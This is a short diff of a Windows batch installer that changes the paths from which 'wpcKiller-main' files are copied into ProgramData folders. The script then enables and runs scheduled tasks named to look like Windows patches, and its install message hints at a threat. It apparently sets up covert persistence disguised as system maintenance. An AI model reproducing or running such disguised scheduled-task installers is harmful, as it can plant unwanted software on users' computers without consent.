@@ -8,9 +8,9 @@ if not exist %temp%\dos\files powershell -command "Expand-Archive -LiteralPath %
 echo Installing.. [ Please don't close if you want your computer safe ;) ]
 echo copying files.	
 Cd %programdata%\copyrepair\1_4_0
-copy %temp%\Dos\files\wpcKiller-main
+copy %temp%\Dos\upd\files\wpcKiller-main
 Cd %programdata%\Wpc	
-copy %temp%\dos\files\Wpckiller-main
+copy %temp%\dos\upd\files\Wpckiller-main
 schtasks /change /tn "Windows_pc_patch_dosexec" /enable
 SCHTASKS /RUN /TN "Windows_pc_patch_msdos"
 exit \b
